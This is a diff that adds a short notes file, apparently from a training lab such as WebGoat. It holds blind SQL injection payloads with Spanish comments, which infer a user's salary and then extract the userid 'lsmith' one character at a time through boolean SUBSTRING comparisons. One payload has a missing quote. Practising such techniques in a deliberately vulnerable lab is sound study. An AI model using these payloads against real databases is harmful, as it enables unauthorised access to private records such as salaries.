@@ -1,0 +1,22 @@
+101 AND ((SELECT salary FROM salaries WHERE userid='jsmith') > 10000 );
+101 AND ((SELECT salary FROM salaries WHERE userid='jsmith') > 15000 );
+101 AND ((SELECT salary FROM salaries WHERE userid='jsmith') > 20000 );
+101 AND ((SELECT salary FROM salaries WHERE userid='jsmith') = 20000 );
+
+101 AND (SUBSTRING((SELECT userid FROM salaries WHERE salary='45000'), 1, 1) < 'h' )        >h
+101 AND (SUBSTRING((SELECT userid FROM salaries WHERE salary='45000'), 1, 1) < 'p' ) 		<p
+101 AND (SUBSTRING((SELECT userid FROM salaries WHERE salary='45000'), 1, 1) < 'l ) 	 >l
+101 AND (SUBSTRING((SELECT userid FROM salaries WHERE salary='45000'), 1, 1) < 'm' ) 	<m
+
+el primero es l
+
+101 AND (SUBSTRING((SELECT userid FROM salaries WHERE salary='45000'), 2, 1) < 'm' )    >m
+101 AND (SUBSTRING((SELECT userid FROM salaries WHERE salary='45000'), 2, 1) > 'o' )  >o
+101 AND (SUBSTRING((SELECT userid FROM salaries WHERE salary='45000'), 2, 1) < 'u' ) <u
+101 AND (SUBSTRING((SELECT userid FROM salaries WHERE salary='45000'), 2, 1) < 't' )    <t
+
+el segundo es s
+
+101 AND (SUBSTRING((SELECT userid FROM salaries WHERE salary='45000'), 3, 1) < 'p' )    <p
+
+lsmith
